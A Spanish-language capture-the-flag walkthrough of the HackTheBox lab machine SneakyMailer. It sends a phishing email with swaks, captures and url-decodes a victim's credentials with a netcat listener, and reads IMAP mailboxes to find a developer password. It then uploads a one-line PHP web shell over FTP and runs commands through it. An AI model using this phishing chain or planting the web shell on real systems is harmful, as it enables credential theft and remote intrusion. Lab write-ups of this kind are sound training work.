## Evaluacion de vulnerabilidades {-}

### Swaksear la lista de email {-}

Es comun que en algunos servicios mail, nos podemos conectar al servidor y enviar email con un correo que no existe bajo el servidor indicado. 
Se puede hacer con la herramienta **swaks**. Aqui lo hacemos por el puerto **25**

```bash
nc -nlvp 80
```

```bash
swaks --to $(cat email.txt | tr '\n' ',') --from "s4vitar@sneakymailer.htb" \
--header "Subject: EEEEEEEE" --body "OH DIOS MIO ES DIAMOND JACKSON -> http://10.10.14.20/diamondjackson.jpg" \
--server 10.10.10.197
```

Ya vemos que podemos enviar el mail y que ademas alguien a pinchado el enlace. Ademas como utilizamos **nc** y no **python**
podemos ver la data enviada en raw. En la data vemos que podemos ver el usuario, el email y su password en formato url encode.

```bash
php --interactive

> print urldecode()"firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt"
```

Ya vemos la contraseña del usuario en texto claro.

Intentamos conectar por **SSH** y **FTP** pero nada

### Conectar por el IMAP con NC {-}

1. Logear por IMAP con NC

    ```bash
    nc 10.10.10.197 143

    A1 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
    #Output
    A1 OK LOGIN Ok.
    ```

1. Listar el contenido

    ```bash
    A2 LIST "" "*"
    ```
    
1. Seleccionar INBOX

    ```bash
    A3 SELECT "INBOX"
    ```

1. Seleccionar los mensajes enviados

    ```bash
    A4 SELECT "INBOX.Sent"
    ```

1. Seleccionar los items enviados

    ```bash
    A5 SELECT "INBOX.Sent Items"
    ```

1. Seleccionar lo que hay en la papelera

    ```bash
    A6 SELECT "INBOX.Deleted Items"
    ```

1. Vemos que hay dos elementos en los items enviados, los recuperamos

    ```bash
    A7 FETCH 1:2 BODY[]
    ```

En los bodys encontramos un un mensaje que pregunta para cambiar la contraseña del usuario developer poniendo 
y la contraseña original en texto claro.
En el otro mensaje otra vez hablan del servicio **Pypi**

Con el usuario y contraseña intentamos volver a conectar con **FTP**

### Conexion con FTP {-}

```bash
ftp 10.10.10.197

> Name: developer
> Password: contraseña
#Output
Connection succesful

dir
cd dev
dir
```

Aqui vemos el contenido de la web. Nos creamos la famosa `s4vishell.php`

```php
<?php
    echo "<pre>". shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

ahora con el ftp subimos el archivo.

```bash
put s4vishell.php
#Output
transfer complete
```

Controlamos en la web si vemos el fichero `http://sneakycorp.htb/s4vishell.php` pero tenemos un *404 NOT FOUND*.
Intentamos con otras url:

- `http://sneakycorp.htb/s4vishell.php`
- `http://10.10.10.197:8080/s4vishell.php`
- `http://10.10.10.197:8080/dev/s4vishell.php`

pero nada. Aqui pensamos en que podria tener otros subdominios.

### Descubrimientos de subdominios de dos formas {-}

#### Descubrimiento de subdominios con GOBUSTER {-}

```bash
gobuster vhost -u http://sneakycorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Encontramos el subdominio `dev.sneakycorp.htb`

#### Descubrimiento de subdominios con WFUZZ {-}

```bash
wfuzz -c -t 200 --hw=12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.sneakycorp.htb" http://10.10.10.197
```

Encontramos el subdominio `dev.sneakycorp.htb`

#### Retocamos en hosts {-}

```bash
nano /etc/hosts
```

```{r, echo = FALSE, fig.cap="hosts dev.sneakycorp.htb", out.width="90%"}
    knitr::include_graphics("images/hosts-dev-sneakycorp.png")
```

### Browsear el nuevo dominio {-}

Como aqui ya tenemos un nuevo dominio browseamos la web en `dev.sneakycorp.htb/s4vishell.php` y ahora si encontramos nuestra webshell.

- whoami con `dev.sneakycorp.htb/s4vishell.php?cmd=whoami`
- verificamos si estamos en un contenedor con `dev.sneakycorp.htb/s4vishell.php?cmd=hostname -I`

no es el caso y tenemos capacidad de remote code execution. Ahora intentamos ganar acceso al sistema.
